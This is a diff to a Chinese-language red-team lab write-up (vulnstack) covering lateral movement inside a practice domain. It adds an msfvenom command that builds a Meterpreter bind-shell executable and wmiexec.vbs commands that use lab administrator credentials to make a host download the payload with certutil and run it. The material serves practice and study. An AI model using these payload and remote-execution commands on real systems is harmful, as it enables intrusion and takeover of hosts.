@@ -379,6 +379,10 @@ ipconfig得到内网网段：192.168.52.1/24。
 右键目标使用svc-exe进行提权看到system上线。
 ![](../../attaches/Pasted%20image%2020220914201213.png)
 
+![](../../attaches/Pasted%20image%2020220914231131.png)
+
+![](../../attaches/Pasted%20image%2020220914231227.png)
+
 在kali中打开msf，并执行以下命令准备一个监听，准备将shell从cs移交给msf。
 ```
 use exploit/multi/handler
@@ -427,6 +431,22 @@ set lport 11111
 ![](../../attaches/Pasted%20image%2020220914210557.png)
 经过百度发现需要开启postgresql服务，重新run。
 ![](../../attaches/Pasted%20image%2020220914210516.png)
+情况有所好转但还是不能建立连接。
+![](../../attaches/Pasted%20image%2020220914232114.png)
+生成正向shell木马，和wmiexec.vbs一起用蚁剑上传到win7的C盘根目录下。
+```
+ msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=6666 -f exe > she11.exe
+```
+![](../../attaches/Pasted%20image%2020220914233830.png)
+```
+cscript.exe wmiexec.vbs /cmd 192.168.52.138 administrator hongrisec@2022 "certutil.exe -urlcache -split -f http://192.168.52.143/she11.exe&she11.exe"
+
+cscript.exe wmiexec.vbs /cmd 192.168.52.138 administrator hongrisec@2022 "certutil.exe -urlcache -split -f http://192.168.52.143/she11.exe | she11.exe"
+
+```
+![](../../attaches/Pasted%20image%2020220915001948.png)
+![](../../attaches/Pasted%20image%2020220915000028.png)
+
 ## vulnstack2
 ### 官方介绍
 红队实战系列，主要以真实企业环境为实例搭建一系列靶场，通过练习、视频教程、博客三位一体学习。本次红队环境主要Access Token利用、WMI利用、域漏洞利用SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用、黄金票据/白银票据/Sid History/MOF等攻防技术。关于靶场统一登录密码：1qaz@WSX
